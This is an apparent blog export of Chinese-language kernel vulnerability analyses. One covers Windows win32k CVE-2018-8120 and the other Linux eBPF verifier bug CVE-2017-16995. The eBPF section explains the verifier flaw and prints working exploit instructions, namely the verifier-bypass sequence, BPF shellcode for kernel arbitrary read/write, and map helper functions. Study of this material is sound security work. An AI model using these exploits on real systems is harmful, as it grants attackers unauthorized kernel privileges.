win32k!NtUserSetImeInfoEx对漏洞函数下断通过syscall调用漏洞函数NtUserSetImeInfoEx，并把我们构建好的内存布局当做参数传入，紧接着内核就会断在win32k!NtUserSetImeInfo函数调用处，来看下我们传给内核的应用层的数据，通过r 输出当前寄存器信息可以看到rcx指向的就是我们应用层构造的数据，单步运行接着内核会通过win32k!memmove函数把应用层的内存数据（0x1c3980）拷贝到内核内存（0xfffff88002943a60）中 接着内核调用PsGetCurrentProcessWin32Process函数获取当前进程的窗口站对象rpwinsta，并索引rpwinsta中的spklList元素，由于存在漏洞，并没有对获取到的pkl元素做合法检查，导致存在0地址解引用的问题，可以看到此时的rax等于0，紧接着索引pkl-&gt;hkl[rax+0x28]的数据，并与ime_info_ex进行比较，如果不等就进入循环，因为我们在触发漏洞之前对0号内存做映射了，所以pkl-&gt;hk和ime_info_ex都是我们可控的，这里的循环我们可以直接绕过。 循环完毕后会索引pkl-&gt;piiex的数据，如果获取的数据不为NULL，并且数据偏移0x4c中的值为0，那么就调用win32k!memmove函数直接把ime_info_ex指向的内存拷贝到pkl-&gt;piiex指向的位置，因为我们在最开始把pkl-&gt;piiex设置成了mpv，所以这里的拷贝就相当于对mpv做写操作，写入的内容是ime_info_ex中的内容，而ime_info_ex前8个字节存放的是wpv的地址，这就相当于把wpv写入到mpv中，我们的GDI内核任意读写就构造好了，接下来使用Gdi32的GetBitmapBits/SetBitmapBits两个函数来实现任意读写的功能，这样就成功完成了把有限的任意地址写转换成内核任意地址读/写。 有了任意读写的功能之后，我们可以替换HalDispatchTable里面的HalQuerySystemInformation函数指针为我们的提权shellcode，替换完成后调用NtQueryIntervalProfile来触发shellcode进行提权。 GDI任意读/写函数指针修改提权shellcode参考https://paper.seebug.org/602/ 文章https://github.com/bigric3/cve-2018-8120 32位源码https://github.com/unamer/CVE-2018-8120 64位源码 https://www.f-secure.com/weblog/archives/kasslin_AVAR2006_KernelMalware_paper.pdfhttp://vexillium.org/dl.php?call_gate_exploitation.pdf https://ti.360.net/blog/articles/analysis-of-cve-2018-8120-in-win-7-x64/http://www.freebuf.com/vuls/173798.html","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Windows_Kernel","slug":"Windows-Kernel","permalink":"http://github.com/tags/Windows-Kernel/"}]},{"title":"CVE-2017-16995","slug":"CVE-2017-16995","date":"2018-07-16T14:40:15.000Z","updated":"2018-08-26T10:38:23.983Z","comments":true,"path":"2018/07/16/CVE-2017-16995/","link":"","permalink":"http://github.com/2018/07/16/CVE-2017-16995/","excerpt":"","text":"CVE-2018-16995 漏洞补丁：https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f123456789101112131415161718diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.cindex 625e358..c086010 100644--- a/kernel/bpf/verifier.c+++ b/kernel/bpf/verifier.c@@ -2408,7 +2408,13 @@ static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn)* remember the value we stored into this reg*/ regs[insn-&gt;dst_reg].type = SCALAR_VALUE;- __mark_reg_known(regs + insn-&gt;dst_reg, insn-&gt;imm);+ if (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;+ __mark_reg_known(regs + insn-&gt;dst_reg,+ insn-&gt;imm);+ &#125; else &#123;+ __mark_reg_known(regs + insn-&gt;dst_reg,+ (u32)insn-&gt;imm);+ &#125; &#125; &#125; else if (opcode &gt; BPF_END) &#123; 该补丁只是简单的判断BPF_CLASS(insn-&gt;code)的结果是否等于BPF_ALU64，根据结果判断调用__mark_reg_known函数时是否把insn-&gt;imm变量转为u32类型传入。 eBPF简介我们知道linux的内核态与用户态是相互隔离的，一般情况下用户态是不能访问内核态，而BPF机制却可以让我们在用户态与内核态之间传输代码，并通过事件来触发内核执行用户态提供的操作，并且可以通过map（key,value）的形式来让用户态和内核做数据共享，当在用户态向map中写入数据，内核可以使用该map来获取用户态写入的数据，相反用户态也可以使用该map来获取用户态写入的数据。BPF分为cBPF（classic PBF）和eBPF（extend BPF），现在一般都是eBPF。 因为存在注入代码，为了最大限度的控制注入代码带来的隐患，cBPF时代就加入了代码检查机制来防止不规范的注入代码，到了eBPF时代则在载入程序（bpf_load_program（））时加入了更为复杂的verifier机制，在运行用户层注入的代码之前，先进行一系列的安全检查，最大限度的保证系统安全，verifier机制会对注入的代码做两轮检查： 首轮检查：实现于check_cfg可以被认为这是一次深度优先搜索，主要目的是对注入代码进行一次DAG（Directed Acyclic Graph，有向无环图）检查，可以保证其中没有循环的存在。除此之外一旦代码中发现以下特征，verifier也会拒绝注入： 代码长度超过限制，目前（内核版本4.12）eBPF的代码上限为4K条指令； 存在可能跳出eBPF代码范围的JMP，这主要为了防止恶意代码故意让程序跑飞； 存在永远无法运行的eBPF指令，例如位于exit之后的指令 次轮检查：实现于do_check较之于首轮检查要细致很多，本轮检查中注入代码的所有逻辑分支从头到尾都会被完全跑上一遍，所有指令的参数（寄存器），访问的内存，调用的函数都会被仔细检查一遍。 注意：eBPF虚拟指令系统存在11个虚拟的寄存器，其中包括R0~R10，该寄存器与我们硬件CPU的物理寄存器所对应1234567891011R0 -- RAX（默认函数返回值寄存器）R1 -- RDI（R1 ~ R5 一般用来表示内核预设函数的参数）R2 -- RSIR3 -- RDXR4 -- RCXR5 -- R8R6 -- RBX（R6 ~ R9 在BPF代码中可以作存储用,其值不受内核预设函数影响）R7 -- R13R8 -- R14R9 -- R15R10 -- RBP(栈帧指针) 首先来看一下每条指令的格式：在eBPF中，struct bpf_insn是一个8字节大小的结构体。[0-7]位代表操作码，[8-11]位代表目标寄存器，[12-15]位代表源寄存器，[16-31]为代表操作的偏移值，[32-63]位代表操作的立即数。 BPF的加载过程： 调用syscall（__NR_bpf，BPF_MAP_CREATE，&amp;attr，size(attr)）申请一个map，在attr结构体中指定map的类型，大小，最大兼容等级。 调用syscall（__NR_bpf，BPF_PROG_LOAD,&amp;attr，sizeof（attr）），将用户态的BPF指令加载到内核态，attr包含指令数量，指令首地址，日志等级。内核态在实际执行这些指令之前会先利用虚拟执行的方式做安全校验，如果安全校验通过后，指令被成功加载到内核，然后实际执行。 使用setsockopt（sockets。SO_SOCKET，SO_ATTACK_BPF，&amp;progfd，sizeof（progfd））把BPF句柄绑定到指定的socket上，Progfd为第二步的返回值。 最后通过操作第三步的socket来触发BPF实际执行。 漏洞成因上面已经说过bpf机制是可以从用户层传入数据让内核层根据特定的格式做解析，并执行解析后的代码，那么是不是什么操作都可以执行呢？那当然不是，内核在解析执行代码之前会存在一个模拟执行的检查操作，如果存在非法操作那么内核是不会去执行的。试想如果我们能够绕过内核层对用户层传入代码的检查那么我们是不是就可以任意操作内核了呢？提权自然也不成问题，而这个漏洞也正是这个效果。因为在实际执行时存在不正确是符号扩展，导致检查时与实际运行时内核对传入的指令语义解析的不一致，如果用户态传的是精心构造的恶意指令，那么可通过绕过内核对指令的安全检查，来执行传入的权限提升代码。 先简单了解一下ebpf的指令格式：在eBPF中，每条指令就是一个struct bpf_insn结构体,大小为8字节。[0-7]位代表操作码，[8-11]位代表目标寄存器，[12-15]位代表源寄存器，[16-31]为代表操作的偏移值，[32-63]位代表操作的立即数。12345678/* \\linux-4.4.1\\include\\uapi\\linux\\bpf.h */struct bpf_insn&#123; __u8 code; /* opcode */ __u8 dst_reg:4; /* dest register */ __u8 src_reg:4; /* source register */ __s16 off; /* signed offset */ __s32 imm; /* signed immediate constant */&#125; 这里举个栗子：指令mov eax，0xffffffff对应的BPF指令如下：123456789#define BPF_MOV32_IMM(DST,IMM) \\ ((struct bpf_insn)&#123; \\ .code = BPF_ALU|BPF_MOV|BPF_K, \\ /* BPF_X代表寄存器，BPF_K代表立即数 */ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM &#125;)opcode:\\xb4\\x09\\x00\\x00\\xff\\xff\\xff\\xffeBPF虚拟指令系统隶属于RISC（精简指令集），也就是每条指令的大小一致。 根据公开的exp可以知道在对以下两条指令进行解析时导致模拟执行与实际执行的语义不一致,促使实际执行的指令并没有被检查12BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF), /* r2 = (u32)0xFFFFFFFF */ \\BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2), /* if (r2 == -1) &#123; */ \\ 首先我们来看检查时的模拟执行是怎么解释这两段代码的，当我们调用系统调用__NR_bpf并且cmd为BPF_PROG_LOAD时，就可以将attr结构体中的insns成员指向的bpf指令传入到内核，内核会调用do_check函数对传入的指令做安全检查。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size) ---&gt; bpf_prog_load(&amp;attr) ---&gt; bpf_check(&amp;prog,attr) ---&gt; do_check(env)static int do_check(struct verifier_env *env)&#123; struct verifier_state *state = &amp;env-&gt;cur_state; struct bpf_insn *insns = env-&gt;prog-&gt;insnsi; struct reg_state *regs = state-&gt;regs; int insn_cnt = env-&gt;prog-&gt;len; int insn_idx, prev_insn_idx = 0; int insn_processed = 0; bool do_print_state = false; init_reg_state(regs); insn_idx = 0; for (;;) &#123; /* 一个大循环,解析用户态传入的每条指令 */ struct bpf_insn *insn; /* 指令结构体指针 */ u8 class; int err; if (insn_idx &gt;= insn_cnt) &#123; /* 如果循环计数insn_idx大于或等于bpf程序的长度 就退出 */ verbose(\"invalid insn idx %d insn_cnt %d\\n\", insn_idx, insn_cnt); return -EFAULT; &#125; insn = &amp;insns[insn_idx]; /* 根据循环计算insn_idx获取本次需要解析的opcode */ class = BPF_CLASS(insn-&gt;code); /* 获取该条指令的CLASS */ if (++insn_processed &gt; 32768) &#123; /* 判断解析指令条数是否大于 32768 */ verbose(\"BPF program is too large. Proccessed %d insn\\n\", insn_processed); return -E2BIG; &#125; err = is_state_visited(env, insn_idx); if (err &lt; 0) return err; if (err == 1) &#123; /* found equivalent state, can prune the search */ if (log_level) &#123; if (do_print_state) verbose(\"\\nfrom %d to %d: safe\\n\", prev_insn_idx, insn_idx); else verbose(\"%d: safe\\n\", insn_idx); &#125; goto process_bpf_exit; &#125; if (log_level &amp;&amp; do_print_state) &#123; verbose(\"\\nfrom %d to %d:\", prev_insn_idx, insn_idx); print_verifier_state(env); do_print_state = false; &#125; if (log_level) &#123; verbose(\"%d: \", insn_idx); print_bpf_insn(insn); &#125; /* 开始解析opcode的class部分 */ if (class == BPF_ALU || class == BPF_ALU64) &#123; err = check_alu_op(env, insn); if (err) return err; &#125; else if (class == BPF_LDX) &#123; [...] &#125; else if (class == BPF_STX) &#123; [...] &#125; else if (class == BPF_ST) &#123; [...] &#125; else if (class == BPF_JMP) &#123; u8 opcode = BPF_OP(insn-&gt;code); if (opcode == BPF_CALL) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;off != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose(\"BPF_CALL uses reserved fields\\n\"); return -EINVAL; &#125; err = check_call(env, insn-&gt;imm); if (err) return err; &#125; else if (opcode == BPF_JA) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;imm != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose(\"BPF_JA uses reserved fields\\n\"); return -EINVAL; &#125; insn_idx += insn-&gt;off + 1; continue; &#125; else if (opcode == BPF_EXIT) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;imm != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose(\"BPF_EXIT uses reserved fields\\n\"); return -EINVAL; &#125; err = check_reg_arg(regs, BPF_REG_0, SRC_OP); if (err) return err; if (is_pointer_value(env, BPF_REG_0)) &#123; [...] &#125;process_bpf_exit: insn_idx = pop_stack(env, &amp;prev_insn_idx); /* 弹出保存在零时栈中的分支 */ if (insn_idx &lt; 0) &#123; break; &#125; else &#123; do_print_state = true; continue; &#125; &#125; else &#123; err = check_cond_jmp_op(env, insn, &amp;insn_idx); if (err) return err; &#125; &#125; else if (class == BPF_LD) &#123; [...] &#125; else &#123; verbose(\"unknown insn class %d\\n\", class); return -EINVAL; &#125; insn_idx++; /* 循环计数 */ &#125; 我们主要关注2个class,分别是BPF_ALU与BPF_JMP先看BPF_ALU,实际逻辑在check_alu_op函数中1234567891011121314151617181920212223242526272829303132333435363738394041if (class == BPF_ALU || class == BPF_ALU64) &#123; err = check_alu_op(env, insn); if (err) return err;/* check validity of 32-bit and 64-bit arithmetic operations */static int check_alu_op(struct verifier_env *env, struct bpf_insn *insn)&#123; struct reg_state *regs = env-&gt;cur_state.regs; u8 opcode = BPF_OP(insn-&gt;code); int err; if (opcode == BPF_END || opcode == BPF_NEG) &#123; [...] &#125; else if (opcode == BPF_MOV) &#123; /* opcode == BPF_MOV */ if (BPF_SRC(insn-&gt;code) == BPF_X) &#123; /* 判断源寄存器是否存在 跳过*/ [...] &#125; else &#123; /* 立即数,进入 */ if (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != 0) &#123; verbose(\"BPF_MOV uses reserved fields\\n\"); return -EINVAL; &#125; &#125; /* check dest operand */ err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP); if (err) return err; if (BPF_SRC(insn-&gt;code) == BPF_X) &#123; /* 判断源寄存器是否存在 跳过*/ [...] &#125; else &#123; /* 立即数,进入 */ /* case: R = imm * remember the value we stored into this reg */ regs[insn-&gt;dst_reg].type = CONST_IMM; /* CONST_IMM = 8 */ regs[insn-&gt;dst_reg].imm = insn-&gt;imm; /* insn-&gt;imm:0xffffffff 对regs[insn-&gt;dst_reg].imm进行赋值,注意这里的regs[insn-&gt;dst_reg].imm与insn-&gt;imm都是有符号32位*/ &#125; &#125; else if (opcode &gt; BPF_END) &#123; [...] &#125; else &#123; /* all other ALU ops: and, sub, xor, add, ... */ [...] &#125; return 0;&#125; 通过BPF_OP获取指令的opcode,这条指令的opcode是MOV,并且使用的是BPF_K,也就是立即数,所以最终把CONST_IMM == 8赋值给regs[BPF_REG_2].type,insn-&gt;imm == -1 赋值给regs[BPF_REG_2].imm,注意:这里需要留意的一点就是insn-&gt;imm和regs[insn-&gt;dst_reg].imm都属于有符号32位。1234567struct reg_state &#123; enum bpf_reg_type type; union &#123; int imm; /* regs[BPF_REG_2].imm */ struct bpf_map *map_ptr; &#125;;&#125;; 接着再来看对BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2)的解析,主要在check_cond_jmp_op函数中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&#125; else &#123; err = check_cond_jmp_op(env, insn, &amp;insn_idx); if (err) return err; &#125;static int check_cond_jmp_op(struct verifier_env *env, /* 该函数主要处理条件分支 */ struct bpf_insn *insn, int *insn_idx)&#123; struct reg_state *regs = env-&gt;cur_state.regs; struct verifier_state *other_branch; u8 opcode = BPF_OP(insn-&gt;code); int err; if (opcode &gt; BPF_EXIT) &#123; verbose(\"invalid BPF_JMP opcode %x\\n\", opcode); return -EINVAL; &#125; if (BPF_SRC(insn-&gt;code) == BPF_X) &#123; if (insn-&gt;imm != 0) &#123; verbose(\"BPF_JMP uses reserved fields\\n\"); return -EINVAL; &#125; /* check src1 operand */ err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP); if (err) return err; if (is_pointer_value(env, insn-&gt;src_reg)) &#123; verbose(\"R%d pointer comparison prohibited\\n\", insn-&gt;src_reg); return -EACCES; &#125; &#125; else &#123; if (insn-&gt;src_reg != BPF_REG_0) &#123; verbose(\"BPF_JMP uses reserved fields\\n\"); return -EINVAL; &#125; &#125; /* check src2 operand */ err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP); if (err) return err; /* detect if R == 0 where R was initialized to zero earlier */ if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; /* 检查条件是否成立 */ (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp; regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp; /* 如果目标寄存器的类型属于立即数 并且 目标寄存器的立即数与当前立即数一致 那么直接进入恒等模式 */ regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123; if (opcode == BPF_JEQ) &#123; /* if (imm == imm) goto pc+off; * only follow the goto, ignore fall-through */ *insn_idx += insn-&gt;off; return 0; &#125; else &#123; /* 因为op等于JNE,所以从这里进入,然后直接返回0 */ /* if (imm != imm) goto pc+off; * only follow fall-through branch, since * that's where the program will go */ return 0; &#125; &#125; other_branch = push_stack(env, *insn_idx + insn-&gt;off + 1, *insn_idx); /* 若当前条件无法确定跳转,那么会把第二条分支临时保存起来 后续若遇到exit指令 就pop出来第二条分支进行模拟执行 */ if (!other_branch) return -EFAULT; /* detect if R == 0 where R is returned value from bpf_map_lookup_elem() */ if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; insn-&gt;imm == 0 &amp;&amp; (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp; regs[insn-&gt;dst_reg].type == PTR_TO_MAP_VALUE_OR_NULL) &#123; if (opcode == BPF_JEQ) &#123; /* next fallthrough insn can access memory via * this register */ regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE; /* branch targer cannot access it, since reg == 0 */ other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM; other_branch-&gt;regs[insn-&gt;dst_reg].imm = 0; &#125; else &#123; other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE; regs[insn-&gt;dst_reg].type = CONST_IMM; regs[insn-&gt;dst_reg].imm = 0; &#125; &#125; else if (is_pointer_value(env, insn-&gt;dst_reg)) &#123; verbose(\"R%d pointer comparison prohibited\\n\", insn-&gt;dst_reg); return -EACCES; &#125; else if (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp; (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123; if (opcode == BPF_JEQ) &#123; /* detect if (R == imm) goto * and in the target state recognize that R = imm */ other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM; other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm; &#125; else &#123; /* detect if (R != imm) goto * and in the fall-through state recognize that R = imm */ regs[insn-&gt;dst_reg].type = CONST_IMM; regs[insn-&gt;dst_reg].imm = insn-&gt;imm; &#125; &#125; if (log_level) print_verifier_state(env); return 0;&#125; check_cond_jmp_op函数主要用来处理分支语句(BPF_JEQ,BPF_JNE),但是因为这里是立即数之间做比较,如果两个立即数相等就会进入恒等情况,直接退出check_cond_jmp_op函数,因为内核认为这是恒等情况永远都会成立,所以也就没有执行保存分支2到临时栈中的代码(push_stack函数),如果我们在条件成立的情况下接着执行BPF_JMP|BPF_EXIT指令,那么内核就会直接跳出大循环,结束安全检查。看看do_check中BPF_EXIT指令的处理代码123456789101112131415161718192021222324252627282930313233343536373839404142434445 else if (opcode == BPF_EXIT) &#123; if (BPF_SRC(insn-&gt;code) != BPF_K || insn-&gt;imm != 0 || insn-&gt;src_reg != BPF_REG_0 || insn-&gt;dst_reg != BPF_REG_0) &#123; verbose(\"BPF_EXIT uses reserved fields\\n\"); return -EINVAL; &#125; /* eBPF calling convetion is such that R0 is used * to return the value from eBPF program. * Make sure that it's readable at this time * of bpf_exit, which means that program wrote * something into it earlier */ err = check_reg_arg(regs, BPF_REG_0, SRC_OP); if (err) return err; if (is_pointer_value(env, BPF_REG_0)) &#123; verbose(\"R0 leaks addr as return value\\n\"); return -EACCES; &#125;process_bpf_exit: insn_idx = pop_stack(env, &amp;prev_insn_idx); /* 弹出保存在零时栈中的分支 */ if (insn_idx &lt; 0) &#123; /* 如果pop_stack返回值小于0 */ break; /* 跳出大循环 */ &#125; else &#123; do_print_state = true; /* 否则设置状态为true */ continue; /* 并结束本次循环 */ &#125;static int pop_stack(struct verifier_env *env, int *prev_insn_idx) /* 弹出零时栈中的分支 */&#123; struct verifier_stack_elem *elem; int insn_idx; if (env-&gt;head == NULL) /* 若env-&gt;head为空,那么返回-1 */ return -1; memcpy(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, sizeof(env-&gt;cur_state)); insn_idx = env-&gt;head-&gt;insn_idx; if (prev_insn_idx) *prev_insn_idx = env-&gt;head-&gt;prev_insn_idx; elem = env-&gt;head-&gt;next; kfree(env-&gt;head); env-&gt;head = elem; env-&gt;stack_size--; return insn_idx;&#125; 因为前面JNE判断语句结果为恒等,所以并没有对分支2进行入栈备份,导致在执行BPF_EXIT操作后,内核打算执行pop_stack函数来获取分支2时因为env-&gt;head为空,所以返回-1,而又因为pop_stack的返回值为-1,内核以为检查完毕了,所以直接执行break退出了for大循环,结束了对用户指令的检查操作。可以看到内核在模拟执行时只检查了4条代码就退出了检查12345#define BPF_DISABLE_VERIFIER() \\ BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF), /* r2 = (u32)0xFFFFFFFF */ \\ BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2), /* if (r2 == -1) &#123; */ \\ BPF_MOV64_IMM(BPF_REG_0, 0), /* exit(0); */ \\ BPF_EXIT_INSN() /* &#125; */ \\ 然后再来看实际执行的情况：实际执行调用链：vfs_write -&gt; new_sync_write -&gt; sock_write_iter -&gt; sock_sendmsg -&gt; sock_sendmsg_nosec -&gt; unix_dgram_sendmsg -&gt; sk_filter -&gt; bpf_prog_run_save_cb -&gt; __bpf_prog_run 函数__bpf_prog_run用做实际解析并执行指令,该函数中有一个大的跳转表(jumptable),通过把每条指令的insn-&gt;code成员作为跳转表的索引值,跳转到需要执行的分支处对不同的指令做处理12select_insn: goto *jumptable[insn-&gt;code]; 我们主要关注的是以下两条分支,对应着用户层传入的前两条指令12[BPF_ALU | BPF_MOV | BPF_K] = &amp;&amp;ALU_MOV_K,[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K, 123ALU_MOV_K: DST = (u32) IMM; /*#define DST regs[insn-&gt;dst_reg] --&gt; u64 regs[MAX_BPF_REG] &lt;- (u32)IMM */ CONT; 实际解析BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF)指令时会把有符号32位的IMM(insn-&gt;imm)强转为无符号32型,并赋值给无符号64位的DST(regs[insn-&gt;dst_reg]),此时DST==0x00000000FFFFFFFF123456JMP_JNE_K: /* 判断当前指令立即数是否与目标寄存器一致 */ if (DST != IMM) &#123; /* 因为DST在上条指令被赋值为了u32类型的0xFFFFFFFF,而本次IMM为无符号64位的0xFFFFFFFFFFFFFFFF,所以不一致*/ insn += insn-&gt;off; /* 当前指令 + 当前指令的偏移参数 = 下条需要执行指令的位置 */ CONT_JMP; /* #define CONT_JMP (&#123; insn++; goto select_insn; &#125;) */ &#125; CONT; 在解析BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2)指令时,因为DST属于无符号64位类型,比较时会把有符号32位的IMM(insn-&gt;imm)隐式转为无符号64位(0xFFFFFFFFFFFFFFFF),而DST最开始被赋值为0x00000000FFFFFFFF所以比较的结果肯定是不相等分析到这里我们可以知道模拟执行时JNE比较结果为恒等,而实际执行是JNE比较结果却为不等,因为实际执行的结果不等,所以会跳转到分支2的位置去接着执行,而分支2在模拟执行时是没有被检查的,所以我们可以把分支2构造为我们用来提权的代码,这样就绕过了内核的安全检查,执行任何我们想执行的代码了。 漏洞利用:现在我们能够让内核执行我们注入的任何代码了，那么又如何进行提权呢？我们可以给内核注入一段shellcode，然后创建一个bpf_map，因为bpf_map是内核层与应用层共享数据用的，所以我们可以在用户层使用bpf_API来修改bpf_map中的值，然后使用writemsg函数触发内核去执行我们注入的shellcode，当执行完前两条指令后会调转到指令5去执行，shellcode根据bpf_map中不同的值去执行不同的操作。首先我们需要通过系统调用__NR_bpf，cmd为BPF_MAP_CREATE来创建一个bpf_map，设置该map最大元素个数为3，第一个元素为操作指令，第二个元素为读写的地址，第三个元素为存放读到的内容或写入数据，这样就组成了一条控制指令：12345678910111213141516171819202122232425262728293031323334353637383940414243444546shellcode：#define BPF_DISABLE_VERIFIER() \\ BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF), /* r2 = (u32)0xFFFFFFFF */ \\ BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2), /* if (r2 == -1) &#123; */ \\ BPF_MOV64_IMM(BPF_REG_0, 0), /* exit(0); */ \\ BPF_EXIT_INSN() /* &#125; #define BPF_MAP_GET(idx, dst) \\ BPF_MOV64_REG(BPF_REG_1, BPF_REG_9), /* r1 = r9 */ \\ /* r1指向bpf_map句柄 */ BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), /* r2 = fp */ \\ BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = fp - 4 */ \\ /* r2 指向idx 表示需要获取的第idx个元素 */ BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx), /* *(u32 *)(fp - 4) = idx */ \\ BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \\ /* static u64 bpf_map_lookup_elem(u64 r1, u64 r2, u64 r3, u64 r4, u64 r5) */ BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), /* if (r0 == 0) */ \\ /* 如果map_lookup_elem的返回值为0,则退出 */ BPF_EXIT_INSN(), /* exit(0); */ \\ BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0) /* r_dst = *(u64 *)(r0) */ /* 把第idx个元素的value写入到对应的寄存器中 *//*-------我们注入的shellcode-------------*/ BPF_DISABLE_VERIFIER BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, -16), /* *(fp - 16) = r1 */ /* BPF的BPF_REG_10 指向内核栈帧 */ /*-------------------shellcode的开始------------------------*/ BPF_LD_MAP_FD(BPF_REG_9, mapfd), /* 把bpf_map句柄赋值给BPF_REG_9 */ BPF_MAP_GET(0, BPF_REG_6), /* r6 = op */ /* 获取map元素1中的op --&gt; 操作码 */ BPF_MAP_GET(1, BPF_REG_7), /* r7 = address */ /* 获取map元素2中的addr --&gt; 需要读写地址 */ BPF_MAP_GET(2, BPF_REG_8), /* r8 = value */ /* 获取map元素3中的value --&gt; 存放读写的内容 */ /* store map slot address in r2 */ BPF_MOV64_REG(BPF_REG_2, BPF_REG_0), /* r2 = r0 */ /* 让r2 指向 map元素3中的value 用作返回值*/ BPF_MOV64_IMM(BPF_REG_0, 0), /* r0 = 0 for exit(0) */ BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 2), /* if (op == 0) 不相等就跳过下面2条指令 */ /* opcode == 0 表述获取内核栈帧 */ /* get fp */ BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0), /* *(r2 - 0) = r10 bpf中r10指向内核栈帧 */ BPF_EXIT_INSN(), BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 3), /* else if (op == 1) 不相等就跳过下面3条指令 */ /* opcode == 1 表示获取skbuff的值 */ /* get skbuff */ BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_10, -16), /* r3 = *(r10 -16) get skbuff */ BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0), /* *(r2 + 0) = r3*/ /* 把结果(r3) 写入到 r2指向的 map-3-value*/ BPF_EXIT_INSN(), BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 2, 3), /* else if (op == 2) 不相等就跳过下面3条指令 */ /* opcode == 2 表示执行读操作 */ /* read */ BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), /* 读操作 r7 == map-2-addr, 获取内核地址中的值 赋值给r3*/ BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0), /* 把结果(r3) 写入到 r2指向的 map-3-value*/ BPF_EXIT_INSN(), /* write */ BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), /* 写操作 */ /* opcode != 1 &amp;&amp; opcode != 2 &amp;&amp; opcode !=0 那么就执行写操作 */ BPF_EXIT_INSN(), 通过系统调用_NR_bpf，cmd为BPF_MAP_UPDATE_ELEM的方式去修改map中key对应的value，1234567891011121314int bpf_lookup_elem(int fd, void *key, void *value)&#123; union bpf_attr attr = &#123; .map_fd = fd, .key = ptr_to_u64(key), .value = ptr_to_u64(value), &#125;; return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));&#125;static void update_elem(int key, unsigned long value) &#123; /* 最底层封装的任意读写 cc控制 */ if (bpf_update_elem(mapfd, &amp;key, &amp;value, 0)) &#123; fail(\"bpf_update_elem failed '%s'\\n\", strerror(errno)); &#125;&#125; 通过系统调用_NR_bpf，cmd为BPF_MAP_LOOKUP_ELEM的方式去获取指定key的value，达到泄漏内核数据的效果1234567891011121314151617int bpf_update_elem(int fd, void *key, void *value, unsigned long long flags)&#123; union bpf_attr attr = &#123; .map_fd = fd, .key = ptr_to_u64(key), .value = ptr_to_u64(value), .flags = flags, &#125;; return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr)); /* 获取key对应value的值 */&#125;static unsigned long get_value(int key) &#123; unsigned long value; if (bpf_lookup_elem(mapfd, &amp;key, &amp;value)) &#123; /* 信息泄漏 根据传入的key获取value */ fail(\"bpf_lookup_elem failed '%s'\\n\", strerror(errno)); &#125; return value;&#125; 